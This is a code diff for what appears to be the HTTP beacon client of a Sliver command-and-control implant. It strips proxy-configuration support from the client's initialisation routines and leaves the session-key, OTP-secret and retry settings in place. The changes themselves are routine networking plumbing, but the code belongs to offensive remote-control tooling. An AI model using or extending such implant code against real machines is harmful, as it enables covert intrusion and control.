@@ -307,8 +307,7 @@ CLEANUP:
 
 PHTTP_CLIENT HttpClientInit
 (
-	_In_ PURI pUri,
-	_In_ PWEB_PROXY pProxyConfig
+	_In_ PURI pUri
 )
 {
 	PHTTP_CLIENT Result = NULL;
@@ -754,7 +753,6 @@ CLEANUP:
 
 PSLIVER_HTTP_CLIENT HttpInit()
 {
-	LPSTR lpProxy = NULL;
 	PSLIVER_HTTP_CLIENT pResult = NULL;
 	BOOL IsOk = FALSE;
 	LPSTR lpEncodedSessionKey = NULL;
@@ -775,16 +773,6 @@ PSLIVER_HTTP_CLIENT HttpInit()
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
 	pResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
 	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
-	lpProxy = GetProxyConfig();
-	if (lpProxy != NULL) {
-		if (!lstrcmpA(lpProxy, "auto")) {
-			pResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
-		}
-		else {
-			pResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
-		}
-	}
-
 	pResult->pHttpConfig->dwNumberOfAttemps = 10;
 	pResult->OtpData.lpBase32Secret = DuplicateStrA(szOtpSecret, 0);
 	pResult->OtpData.dwInterval = 30;
@@ -826,10 +814,6 @@ PSLIVER_HTTP_CLIENT HttpInit()
 	pResult->lpHostName = DuplicateStrA(szUri, 0);
 	IsOk = TRUE;
 CLEANUP:
-	if (lpProxy != NULL) {
-		FREE(lpProxy);
-	}
-
 	if (lpEncodedSessionKey != NULL) {
 		FREE(lpEncodedSessionKey);
 	}
@@ -1078,7 +1062,6 @@ BOOL HttpStart
 	PHTTP_RESP pResp = NULL;
 	PBUFFER pDecodedResp = NULL;
 	DWORD cbDecodedResp = 0;
-	PWEB_PROXY pProxyConfig = NULL;
 	PBUFFER pSessionId = NULL;
 	PBYTE pEncryptedSessionInit = NULL;
 	LPSTR lpRespData = NULL;
@@ -1099,7 +1082,7 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	pHttpClient->pHttpClient = HttpClientInit(pUri, pHttpClient->pHttpConfig->pProxyConfig);
+	pHttpClient->pHttpClient = HttpClientInit(pUri);
 	if (pHttpClient->pHttpClient == NULL) {
 		goto CLEANUP;
 	}
